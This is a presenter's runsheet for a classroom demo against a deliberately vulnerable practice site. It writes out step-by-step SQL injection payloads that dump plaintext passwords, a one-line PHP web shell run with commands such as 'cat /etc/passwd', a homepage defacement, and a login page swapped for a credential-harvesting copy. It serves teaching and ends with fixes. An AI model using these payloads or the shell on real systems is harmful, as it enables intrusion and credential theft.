# Runsheet - 30 minutes

Picks up from slide 13, **DEMO TIME**. Slide 12 has just named the three
classic bugs; this is two of them, on one site, in a row.

## Before you start

- [ ] `docker compose up -d --build` on the droplet, and load the site once
      in the browser you will present from.
- [ ] Open **two tabs**: the gallery, and the drop site (**DROP SITE** in
      the top strip). You will flip between them at the end.
- [ ] Browser zoom at 150%. The payloads are long and the back row is real.
- [ ] Have the administrator password written down somewhere, in case the
      injection is being awkward and you need to move on.
- [ ] Close the guided panel. You are the guide for the next 30 minutes.

> The site hands you a *clean* copy because your browser is its own sandbox.
> Walking the whole thing now spoils nothing for the room afterwards.

---

## 0:00 - Frame it (2 min)

Show the gallery. An ordinary photo-sharing site: members, photos, a search
box, a login.

> "Nothing on this page says 'hack me'. There is no admin panel on display,
> no error, no clue. This is what a target looks like. We are going to end up
> reading everybody's password and running commands on the server, and we
> start by typing into a search box."

---

## 2:00 - Make the database speak (10 min)

**Search `reef`.** Photos come back.

> "That word just went into the database and came back. Hold on to *went
> into*."

**Search `'`** - one apostrophe. A red SQL error appears.

> "That is the database complaining. Not the website - the database. Which
> means what I typed did not arrive as a *word to search for*. It arrived as
> part of the instruction."

Show the query shape on screen or say it:
`... WHERE title LIKE '%` **your text** `%'`

> "My apostrophe closed their quote early. The rest stopped making sense. So
> let's close it on purpose and write our own ending."

**Count the columns.** `' ORDER BY 5 -- -` works, `' ORDER BY 6 -- -` says
*Unknown column '6'*.

> "Five. The database just answered a question about itself."

**Add a row.** `zzz' UNION SELECT 1,2,3,4,5 -- -`

> "`zzz` matches no photo, so everything you see now is mine. Two of those
> numbers came out on the card - that's where I can print things."

**Prove control.** `zzz' UNION SELECT 1,database(),3,4,version() -- -`

**List the tables.**
`zzz' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database() -- -`

> "There's a `users` table. Obviously there is."

**The money shot.**
`zzz' UNION SELECT 1,username,3,4,password FROM users -- -`

**Stop talking.** Let them read it. Scroll slowly. Page through.

> "Forty-two accounts. Those are not password hashes I have to crack. Those
> are the passwords. Look how many are the same word - that's slide 2, the
> hands that went up for *used the same password on two sites*."

**Narrow to the prize.**
`zzz' UNION SELECT 1,username,3,4,password FROM users WHERE is_admin=1 -- -`

> "And that is the administrator. Notice it is not a weak password. It never
> had to be - they wrote it down for me."

---

## 12:00 - Walk in the front door (2 min)

Log in as `admin` with the password now on screen.

> "No exploit here. I am typing a username and a password into a login form,
> exactly as intended. From the server's point of view the administrator just
> arrived for work."

Point at the new **ADMIN** tab.

---

## 14:00 - Get the server running your code (5 min)

**PROFILE -> Edit profile.** Show the avatar upload.

> "This expects a photo. Let's find out whether it checks."

Show `shell.php` in an editor - all 19 characters:

```php
<?php system($_GET['c']); ?>
```

> "Whatever you put in `c`, the server runs. That's it. That's the whole
> program."

Upload it. It accepts.

> "No complaint about the extension, because nobody looked. My profile
> picture is now a program."

Open it with `?c=id`.

> "`www-data`. That is not my browser. That is a command, running on a server
> in a data centre, because I uploaded a file."

Then `?c=ls -la`, then `?c=cat /etc/passwd`.

---

## 19:00 - The loud one (3 min)

```
?c=echo "<h1>OWNED BY WEEK 1</h1>" > home.html
```

Open the homepage. It's gone.

> "This is the **I** in the CIA triad - integrity. It is also the *least*
> damaging thing I could have done, because you can see it. Somebody notices
> within the hour and it is fixed by Friday."

Click **RESTORE HOMEPAGE**.

---

## 22:00 - The quiet one (6 min)

> "Here is what an attacker actually does."

Show the folder listing: `login.php` is sitting in the directory the upload
form writes into.

> "That is the page every member signs in through. And I can replace it."

Switch to the **drop site** tab. Empty.

> "Empty. People are logging into this site constantly and none of it reaches
> me, because the site never writes a password down anywhere I can read."

Show `payloads/login.php`. Scroll to the four added lines.

> "Same login page. Still works, still rejects wrong passwords, nothing on
> screen changes. Four lines, and it writes down what you typed on the way
> past - before any hashing, which is why 'we hash our passwords' would not
> have saved anybody here."

Upload it as `login.php`.

Go back to the drop site. **Leave it open.** Credentials start arriving every
few seconds.

> "Those are real members signing in right now, doing nothing wrong. I am not
> attacking them. I am just standing where their passwords go past. And
> nothing is broken, so nobody reports it. This runs until somebody reads the
> file by hand."

Let it run while you talk. It fills on its own.

---

## 28:00 - Land it (2 min)

> "Two bugs. Both decades old. Both still shipping.
>
> The search box trusted text to stay text. Fix: bind the parameter - pass
> the search term as a *value*, never as part of the query.
>
> The upload form trusted a filename to describe its contents. Fix: store
> uploads outside the web root, rename them, and never let the server execute
> what a user sent.
>
> And the one that turned a bad day into a catastrophe - passwords stored as
> written. Hashing would not have stopped the injection. It would have stopped
> the injection from *mattering*."

Then slide 13's three rules: **stay in scope, practice targets only, write it
down.**

---

## Letting them play

Give out the URL. Everything they need is in the panel on the right - 23
steps, a copy button on every payload, credentials at the top.

Tell them three things:

1. **"The guide is on the right. Open it."**
2. **"You get your own copy of the site. You cannot break it for anybody
   else, and nobody has done it for you already."**
3. **"If you wreck yours, press RESET."**

Then stop talking and let them get stuck. Getting stuck is the lesson.

## If it goes wrong

| Problem | Do this |
|---------|---------|
| SQL payload returns nothing | Check for a smart-quote. Copy from the guide panel instead of typing. |
| Can't log in as admin | Password is in `sql/01-schema.sql`. Keep moving. |
| Upload seems to do nothing | It worked - the toast says where it went. The broken-image avatar *is* the shell. |
| Shell gives a blank page | The command ran and printed nothing. Try `?c=id`. |
| Drop site stays empty | Make sure the file was uploaded as exactly `login.php`. Check `RESET` was not pressed after. |
| Site is wrecked | **RESET** in the top strip. Two seconds, and only yours. |
